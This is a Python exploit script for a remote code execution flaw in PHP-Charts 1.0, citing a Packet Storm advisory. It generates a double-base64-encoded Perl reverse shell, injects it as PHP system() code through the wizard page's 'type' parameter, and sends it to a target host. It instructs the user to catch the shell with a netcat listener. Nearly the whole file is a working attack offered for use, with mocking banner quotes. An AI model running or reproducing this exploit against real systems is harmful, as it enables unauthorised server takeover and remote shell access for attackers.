#!/usr/bin/python
# Original Advisory came from:
# http://packetstormsecurity.com/files/119582/PHP-Charts-1.0-Code-Execution.html
# infodox - insecurety.net
import requests
import random
import threading
import sys

def genpayload(host, port):
    """ Perl Reverse Shell Generator """
    load = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';""" %(host, port)
    encoded = load.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '')
    encoded = encoded.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '') # double encoding , yes
    payload = "system(base64_decode(base64_decode('%s')))" %(encoded)
    return payload


def hack(pwn):
    requests.get(pwn)

def main():
    haxurl = "http://" + target + path + "wizard/index.php?type=';INSERTCODE;//"
    payload = genpayload(host, port)
    pwn = haxurl.replace("INSERTCODE", payload)
    print "[+] Preparing for hax"
    print "[!] Please run nc -lvp %s on your listener" %(port)
    raw_input("Press Enter to Fire...") # debugging
    print "[*] Sending malicious request..."
    threading.Thread(target=hack, args=(pwn,)).start() # ph33r l33t thr34d1ng
    print "[?] g0tr00t?"
    sys.exit(0)

def randomQuote():
    quotes =\
    ['Now with advice from Sabu!', 'Now with LOIC Support', 'Now with auto-DDoS',
    'Now with auto-brag!', 'Now with advice from Kevin Mitnick', 'Now with silly quotes!',
    'Comes with free forkbombs!', 'Now with a free copy of Havij', 'Are you stoned, or just stupid?']
    randomQuote = random.choice(quotes)
    return randomQuote

def banner():
    print "PHP-Charts v1.0 Remote Code Execution Exploit."
    randomquote = randomQuote()
    print randomquote

if len(sys.argv) != 5:
    banner()
    print "Usage: %s <target host> <path to wizard> <listener host> <listener port>" %(sys.argv[0])
    print "Example: %s hackme.com /wp/chart/chart/ hacke.rs 1337" %(sys.argv[0])
    sys.exit(1)
else:
    banner()
    target = sys.argv[1]
    path = sys.argv[2]
    host = sys.argv[3]
    port = sys.argv[4]
    main()